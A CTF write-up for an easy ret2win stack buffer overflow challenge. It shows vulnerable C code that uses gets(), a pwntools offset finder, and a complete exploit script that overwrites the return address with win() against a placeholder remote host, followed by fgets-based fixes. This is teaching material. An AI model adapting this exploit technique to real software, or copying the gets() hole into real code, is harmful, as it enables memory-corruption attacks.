---
title: "Sample Pwn Challenge - Buffer Overflow"
date: 2024-01-25T16:45:00+07:00
draft: false
description: "Classic stack buffer overflow exploitation challenge"
categories: ["Pwn"]
tags: ["Buffer Overflow", "Stack Exploitation", "Pwntools", "x64"]
ctfs: ["Example CTF 2024"]
author: "Zicc0Nguyen"
ShowToc: true
TocOpen: true
---

## Challenge Information

- **CTF:** Example CTF 2024
- **Category:** Binary Exploitation
- **Difficulty:** Easy
- **Points:** 150
- **Solves:** 156

## Description

A simple binary with a buffer overflow vulnerability. Can you exploit it to get the flag?

**Challenge Files:**
- `vuln` - The vulnerable binary
- `vuln.c` - Source code (provided for learning)

**Connection:** `nc example-ctf.com 1337`

## Reconnaissance

First, let's examine the binary:

```bash
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked

$ checksec vuln
[*] '/home/user/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key observations:
- **No stack canary**: Buffer overflow won't be detected
- **No PIE**: Addresses are fixed, making exploitation easier
- **NX enabled**: Stack is not executable, need to use ROP or ret2win

Let's look at the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    system("/bin/cat flag.txt");
}

void vuln() {
    char buffer[64];
    printf("Enter your name: ");
    gets(buffer);  // Vulnerable function!
    printf("Hello, %s!\n", buffer);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

## Vulnerability Analysis

The vulnerability is in the `gets()` function, which doesn't perform bounds checking:

```c
char buffer[64];
gets(buffer);  // No size limit!
```

This allows us to write beyond the 64-byte buffer and overwrite:
1. Saved RBP (8 bytes)
2. Return address (8 bytes)
3. Anything else on the stack

The program also conveniently provides a `win()` function that reads the flag.

### Finding the Offset

Let's find the exact offset to the return address using a cyclic pattern:

```python
from pwn import *

# Generate pattern
pattern = cyclic(100)

# Run locally
p = process('./vuln')
p.sendlineafter(b'name: ', pattern)

# Get crash info
p.wait()
core = p.corefile
stack = core.rsp
pattern_offset = cyclic_find(core.read(stack, 4))

print(f"Offset to RIP: {pattern_offset}")
```

Output:
```
Offset to RIP: 72
```

## Exploitation

Now we know we need 72 bytes of padding to reach the return address.

### Exploit Strategy

1. Fill the buffer with 72 bytes of junk
2. Overwrite return address with address of `win()`
3. Profit!

### Finding win() Address

```bash
$ objdump -d vuln | grep win
0000000000401142 <win>:
```

The `win()` function is at address `0x401142`.

### Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
BINARY = './vuln'
HOST = 'example-ctf.com'
PORT = 1337

# Addresses
WIN_ADDR = 0x401142

# Local or remote
if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process(BINARY)

# Build payload
offset = 72
payload = b'A' * offset
payload += p64(WIN_ADDR)

# Send payload
p.sendlineafter(b'name: ', payload)

# Get flag
p.interactive()
```

### Running the Exploit

```bash
# Test locally
$ python3 exploit.py
[+] Starting local process './vuln': pid 12345
[*] Switching to interactive mode
Hello, AAAAAAAAAAAAAAAAAAAAAA...!
flag{b4s1c_buff3r_0v3rfl0w}

# Run against remote
$ python3 exploit.py REMOTE
[+] Opening connection to example-ctf.com on port 1337: Done
[*] Switching to interactive mode
Hello, AAAAAAAAAAAAAAAAAAAAAA...!
flag{b4s1c_buff3r_0v3rfl0w}
```

### Advanced: Stack Alignment

In some cases, you might need to align the stack before calling functions. Add a `ret` gadget:

```python
# Find a ret gadget
RET_GADGET = 0x40101a  # ret instruction

payload = b'A' * offset
payload += p64(RET_GADGET)  # Align stack
payload += p64(WIN_ADDR)    # Call win()
```

## Flag

```
flag{b4s1c_buff3r_0v3rfl0w}
```

## Key Takeaways

1. **Never use gets()**: It's deprecated and dangerous - use `fgets()` instead
2. **Stack canaries**: Modern protections detect buffer overflows
3. **Return address control**: Overwriting return address gives code execution
4. **Ret2win pattern**: Common in beginner pwn challenges
5. **Stack alignment**: x64 requires 16-byte aligned stack for some function calls

## Defensive Measures

To prevent this vulnerability:

```c
// Instead of:
gets(buffer);

// Use:
fgets(buffer, sizeof(buffer), stdin);

// Or even better, use safer alternatives:
if (fgets(buffer, sizeof(buffer), stdin) != NULL) {
    buffer[strcspn(buffer, "\n")] = '\0';  // Remove newline
}
```

## Tools Used

- **pwntools**: Python exploitation framework
- **GDB + pwndbg/gef**: Debugging and analysis
- **checksec**: Binary security property checker
- **objdump**: Disassembler
- **ROPgadget**: Finding ROP gadgets (if needed)

## References

- [Pwntools Documentation](https://docs.pwntools.com/)
- [Stack Buffer Overflow - OWASP](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)
- [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html)
- [LiveOverflow Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
